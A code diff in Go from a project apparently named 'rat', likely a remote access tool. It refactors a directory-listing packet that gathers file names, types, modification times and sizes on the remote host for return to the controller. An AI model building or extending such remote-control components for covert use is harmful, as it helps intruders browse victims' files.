@@ -9,15 +9,23 @@ import (
 	"rat/common"
 )
 
-type DirectoryPacket struct {
-	Path string
+type FileData struct {
+	Dir    bool
+	Name   string
+	Edited string
+	Size   int64
 }
 
-func (packet DirectoryPacket) GetHeader() common.PacketHeader {
+type DirectoryPacket struct {
+	Path  string
+	Files []FileData
+}
+
+func (packet DirectoryPacket) Header() common.PacketHeader {
 	return common.DirectoryHeader
 }
 
-func (packet DirectoryPacket) Write(c *Connection) error {
+func (packet DirectoryPacket) Init() {
 	var files []os.FileInfo
 	var err error
 
@@ -35,29 +43,22 @@ func (packet DirectoryPacket) Write(c *Connection) error {
 		fmt.Println(err.Error())
 	}
 
-	c.WriteInt(len(files))
-
 	for i := 0; i < len(files); i++ {
 		file := files[i]
 		dir := file.IsDir()
-		c.WriteBool(dir)
-		c.WriteString(file.Name())
 
-		t := file.ModTime()
-		c.WriteString(t.Format("2006-01-02 15:04:05"))
-
-		if !dir {
-			c.WriteInt64(file.Size())
-		}
+		packet.Files = append(packet.Files, FileData{
+			dir,
+			file.Name(),
+			file.ModTime().Format("2006-01-02 15:04:05"),
+			file.Size(),
+		})
 	}
-
-	return nil
 }
 
-func (packet DirectoryPacket) Read(c *Connection) error {
-	path, err := c.ReadString()
+func (packet DirectoryPacket) OnReceive() error {
 	go func() {
-		Queue <- DirectoryPacket{path}
+		Queue <- DirectoryPacket{Path: packet.Path}
 	}()
-	return err
+	return nil
 }
